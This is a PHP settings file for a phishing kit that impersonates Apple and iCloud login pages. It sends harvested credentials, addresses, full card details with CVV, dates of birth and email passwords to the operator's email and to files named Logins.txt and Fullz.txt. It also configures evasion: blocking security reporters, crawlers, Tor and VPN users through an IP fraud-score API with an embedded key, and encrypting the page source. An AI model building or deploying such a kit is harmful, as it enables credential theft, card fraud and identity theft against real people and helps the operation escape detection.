<?php

###############################
# enable: 1					  #
# disable: 0				  #
###############################


########################################[GLOBAL Settings]#################################################

# Recipients, Supports multi emails seperated by comma
$recipients = array("xxxxx@protonmail.com", );


# if value is set to '1' then the results will be sent to the email(s).
$send_results_to_email = 1;

# Nick name to be used for styling the results
$nickname = "genjo";

# if value is set to '0' then the results will not be saved to file.
# results will be saved in 'prv' folder
$save_results_to_text = 1;
$results_logins_file = 'Logins.txt';
$results_address_file = 'Address.txt';
$results_fullz_file = 'Fullz.txt';


# default language file to show. languages can be updated from 'languages' folder
$default_language = 'en';


# Dynamically dispaly language based on user browser language. If disabled, default language will be used.
$dynamic_language = 1;


# Log visitors info to Xlog/log.txt
$log_visits = 1;


# Default Country name selected in profile page (address page)
$default_country = '';



# If value is set to 1 then icloud login page will be shown instead
$use_icloud_login_page = 0;


# If value is set to '1' then the address page profile.php will not be shown
$disable_address_page = 0;


# if value is set to '1' then the login page auth.php will not be shown
$disable_login_page = 0;


# if value is set to '1' then the billing info page verify.php will not be shown
$disable_bank_info_page = 0;

# if value is set to '1' then the processing page processing.php will not be shown
$disable_processing_page = 0;

# if value is set to '1' then the confirmation page success.php will not be shown
$disable_confirmation_page = 0;


# URL to redirect after user finish 
$final_redirect_url = 'https://www.apple.com/';


########################################[Anti-bot Settings]#################################################

# Enable Referrer URL Protection
$enable_ref_protection = 0;

# ScamPage must be accessed through a redirect url or access will be denied
$allowed_referer_domain = "scampagehosteddomain.com";

 

# You can block a country, browser, referer, useragent or hostname from blocked.php file
# disable or enable visitors filter, keep it enabled to block known reporters networks & bots. settings defined in blocked.php
# check visitors: hostname, ip, isp, referer, useragent.
$enable_blocker = 1;


# Enable scampage html source encryption
$enable_encrypter = 1; 

# Enable Live IP Score check
$enable_live_ip_score_check = 1;

# Live IP Check API Settings
$ip_score_api_url = 'https://www.ipqualityscore.com/api/json/ip/';

# API KEY
$ip_score_api_key = "z4sUuF6IzPZNNYD6cfXFHvj2xnnU37zk";

# IP max fraud score a value between 0 and 100. if the ip score is equal or greater to the defined value then the ip request will be rejected
$max_fraud_score = 75;

$block_tor = 1;
$block_proxy = 1;
$block_vpn = 1;
$block_crawler = 1;

########################################[Bank Info card page settings exception.php]#################################################

# if value is set to '0' then the card CVV number field will not be shown
$request_for_cvv = 1;

# if value is set to '0' then the date of birth field will not be shown
$request_for_date_of_birth = 1;

# if value is set to '0' then email password field will not be shown.
$request_for_email_password = 1;


?>